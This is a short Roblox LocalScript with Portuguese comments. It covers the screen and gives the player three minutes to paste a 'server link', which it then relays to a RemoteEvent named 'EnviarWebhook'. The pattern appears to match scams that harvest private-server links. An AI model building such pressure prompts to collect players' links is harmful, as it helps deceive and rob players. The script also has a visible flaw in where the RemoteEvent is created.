-- LocalScript em StarterPlayerScripts

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

-- Cria RemoteEvent se não existir
local remote = ReplicatedStorage:FindFirstChild("EnviarWebhook")
if not remote then
    remote = Instance.new("RemoteEvent")
    remote.Name = "EnviarWebhook"
    remote.Parent = ReplicatedStorage
end

local player = Players.LocalPlayer

-- Tela escura
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "TelaEscura"

local black = Instance.new("Frame", gui)
black.Size = UDim2.new(1,0,1,0)
black.BackgroundColor3 = Color3.new(0,0,0)
black.BackgroundTransparency = 0.4

local box = Instance.new("TextBox", gui)
box.Size = UDim2.new(0, 400, 0, 50)
box.Position = UDim2.new(0.5, -200, 0.5, -25)
box.AnchorPoint = Vector2.new(0.5, 0.5)
box.PlaceholderText = "Cole o link do servidor aqui"
box.Text = ""
box.TextScaled = true

local info = Instance.new("TextLabel", gui)
info.Size = UDim2.new(0,400,0,36)
info.Position = UDim2.new(0.5,-200,0.5,-80)
info.AnchorPoint = Vector2.new(0.5, 0)
info.BackgroundTransparency = 1
info.TextColor3 = Color3.new(1,1,1)
info.TextScaled = true
info.Text = "Insira o link do servidor. Você tem 3 minutos!"

-- Timer de 3 minutos
local finished = false
spawn(function()
    wait(180)
    if not finished then
        box.TextEditable = false
        info.Text = "Tempo esgotado!"
        wait(2)
        gui:Destroy()
    end
end)

box.FocusLost:Connect(function(enter)
    if enter and box.Text ~= "" and not finished then
        finished = true
        -- Envia para o servidor
        remote:FireServer(box.Text)
        info.Text = "Enviado! Obrigado."
        box.TextEditable = false
        wait(2)
        gui:Destroy()
    end
end)
